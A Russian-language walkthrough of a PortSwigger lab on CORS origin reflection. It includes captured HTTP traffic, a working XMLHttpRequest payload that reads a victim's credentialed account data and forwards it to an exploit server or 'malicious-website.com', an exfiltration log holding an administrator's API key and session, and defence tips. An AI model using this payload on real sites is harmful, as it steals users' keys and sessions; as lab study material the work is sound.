

```c
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='//malicious-website.com/log?key='+this.responseText; };
```

лаба https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
### CORS vulnerability with basic origin reflection

задание:
создайте некоторый JavaScript, который использует CORS для извлечения ключа API администратора и загрузки кода на ваш сервер эксплойтов

-------

изучая карту сайта
нешел запрос который возвращает данные о пользователе
```http
GET /accountDetails HTTP/2
Host: 0a7500ae03e2610c80f98699001d0019.web-security-academy.net
Cookie: session=nqsGpUdJEtAXJ0lrUy0KWYSj6wzBbfsG
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7500ae03e2610c80f98699001d0019.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i



-------------

ответ

HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "XYSzRUoZ3uUAteQSbcyOZj0ylEjSAJeQ",
  "sessions": [
    "nqsGpUdJEtAXJ0lrUy0KWYSj6wzBbfsG"
  ]
}


```

либо такой запрос - тоже возвращает апи ключ через js код
и еще csrf
```http
GET /my-account?id=wiener HTTP/2
Host: 0a7500ae03e2610c80f98699001d0019.web-security-academy.net
Cookie: session=nqsGpUdJEtAXJ0lrUy0KWYSj6wzBbfsG
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7500ae03e2610c80f98699001d0019.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```
ответ
```html

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 4128


                       <div>Your API Key is: <span id=apikey></span></div>
                        <script>
                            fetch('/accountDetails', {credentials:'include'})
                                .then(r => r.json())
                                .then(j => document.getElementById('apikey').innerText = j.apikey)
                        </script>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="Rn3rjQ2LookM97pwHWnsgsbzkRLjdGrp">
                            <button class='button' type='submit'> Update email </button>
```
но в нем нет в ответе `Access-Control-Allow-Credentials: true`
и апи ключ тут не присутствует в открытом виде, так как апи ключ приходит позже запросом (что выше)  `GET /accountDetails HTTP/2`

------------

для начала попробую просто сделать просто запрос к своему эксплойй серверу
то есть - сначала - нужно найти уязвимость корс 

и в первом запросе `GET /accountDetails`
в ответе видно `Access-Control-Allow-Credentials: true`
это означает 

> >Access-Control-Allow-Credentials  
>	
	Если этот заголовок стоит true, то браузер отправит куки вместе с запросом
	Без него (даже если CORS разрешен), данные будут неавторизованные, как гость без приглашения = это значит что **этот конкретный эндпоинт** разрешает запросы с куками


пробую заставить сервер сделать отражение и на мой сервер
я добавлю Origin: заголок ведущий к моему серверу

у меня есть собственный сервер
`https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6`

делаю запрос в репитере
```http
GET /accountDetails HTTP/2
Host: 0a4900120436196680c6034d0061008c.web-security-academy.net
Cookie: session=XJhctrWgfDIRPfyvrCoNskSrLswS44OO
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Origin: https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6
Referer: https://0a4900120436196680c6034d0061008c.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


```

получаю ответ в репитере
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "imjqXtTLMr5X0u4LGcd5vxRNFbMtwIDk",
  "sessions": [
    "XJhctrWgfDIRPfyvrCoNskSrLswS44OO"
  ]
}
```

и успех! я вижу - что мой сервер отразился в ответе! 
это значит - что данные должны были уйти и на него
но на моем сервере тишина...
так и должно быть!
так как 
вот это все
```http
Access-Control-Allow-Origin: https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6
Access-Control-Allow-Credentials: true
```
означает то - что этот браузер разрешит скриптам в этом браузере выдавать данные из ответов!
ТО ЕСТЬ сервер не делает запрос на мой сайт. Он просто отвечает браузеру: "я разрешаю твоему скрипту с сайта `exploit-server` прочитать мой ответ!!!

---------
то есть сам факт - что сервер вернул в ответе 
```http
Access-Control-Allow-Origin: https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6
Access-Control-Allow-Credentials: true
```

означает уже уязвимость! так как - теперь с такими заголовками - браузер с легкой совестью отдаст на этот сайт (отраженный в ответе) любые данные - так как браузер верит тому - что пришло с его сервера!!

----
теперь нужно создать на своем сервере такой эксплойт - который сделает запрос к этому оригинальному сайту и запросит данные!!

---
вот по образцу из портсвигера
```html
<script>
    var req = new XMLHttpRequest();
    //объект для AJAX-запроса - подготовка к запросу на сервак
    
    req.onload = function() {
        // Этот location перенаправит жертву на страницу лога,
        // а ключ будет в URL-параметре key
        // авто сработае когда прийдет ответ
        
        location='https://exploit-0ad2003f03fd836f803f02bd01b60092.exploit-server.net/log?key=' + this.responseText;
        // this.responseText - это данные из ответа сервера // ссылка - это на мой эксплойт сервер
        //location - автоматически - выполняет запрос 
    };
    // далее настройка запроса гет
    
    req.open('get','https://0a0f006d0393835f8063036c00140009.web-security-academy.net/accountDetails', true); 
    // /accountDetails  - это тот запрос который возвращает все данные о юзере!
    
    req.withCredentials = true; // прикрепит к запросу куки и авторизационные данные этого сайта (жертвы)
    
    req.send(); // шлем это дело куда надо )
     
</script>
```

сохраняю эксплойт на своем сайте
отправляю ссылку на этот сайт жертве

-----------

1 скидываю ссылку жертве
2 жертва кликает по ссылке и попадает на мой сайт
3 на моем сайте автоматом происходит отправка запроса req.open к сайту с кторого нужно угнать куки
4 req.withCredentials - куки прикрепляются к ответу
5 location - ловит ответ+куки от сайта и отправляет их на мой exploit сервер

(получается - что я создал свой сайт, 
когда жертва перешла на мой сайт - то
на тот реефер откуда пришел (вернее с какого сайта пришла жертва -) то на этот сайт отправляется запрос на передачу куки (отправку кку) на мой сервер обратно!)

---------


она переходит на него

```c
10.0.3.131      2026-03-06 11:31:52 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

10.0.3.131      2026-03-06 11:31:53 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22pzJQdhgnPjZpKvgUw6l5A8IOz0VDRVyk%22,%20%20%22sessions%22:%20[%20%20%20%20%22ALF78mspmO5fP9UxWrWDEtE1nzKgZ3O4%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

10.0.3.131      2026-03-06 11:31:53 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

45.67.139.104   2026-03-06 11:31:53 +0000 "GET / HTTP/1.1" 200 "user-agent: Mozil


-------------

раскродировал

10.0.3.131      2026-03-06 11:31:53  0000 "GET /log?key={  
"username": "administrator",
"email": "",  
"apikey": "pzJQdhgnPjZpKvgUw6l5A8IOz0VDRVyk",  

"sessions": [    "ALF78mspmO5fP9UxWrWDEtE1nzKgZ3O4"  ]} 
HTTP/1.1" 200 
"user-agent: Mozilla/5.0 (Victim) 
AppleWebKit/537.36 
(KHTML, like Gecko) 
Chrome/125.0.0.0 
Safari/537.36"


```

и вот все данные куки жертвы уехали ко мне!
pzJQdhgnPjZpKvgUw6l5A8IOz0VDRVyk апи ключ

лаба решена!!

----------



#### как быстро обнаружить возможность такой простой уязвимости

1 ) в ответе был заголовок `Access-Control-Allow-Credentials: true`
это значит, что сайт готов пересылать запросы с куками
2 ) подставил заголовок `Origin` и он отразился в ответе 
	`Access-Control-Allow-Origin: https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6`


#### как защититься

никогда не отражай Origin вслепую , проверять только по строгому белому списку доменов

никогда не добавлять  `null` в белый список

CORS — это инструкция для браузера, а не защита сервера. злоумышленник может послать запрос напрямую с сервера, минуя браузер и все CORS 
поэтому: =-= авторизация и проверка прав обязательны на каждом эндпоинте

включай только те HTTP методы, которые реально нужны, без необоходимости другие не добавлять

ставить заголовок `Access-Control-Max-Age`, чтобы браузер кэшировал preflight запросы, - это не защита напрямую, но уменьшает нагрузку

можно ставить кукам атрибут `SameSite: Lax` или `Strict`, что это ограничивает отправку кук с кросс-доменных запросов и может заблокировать атаку даже при неправильном CORS



----------

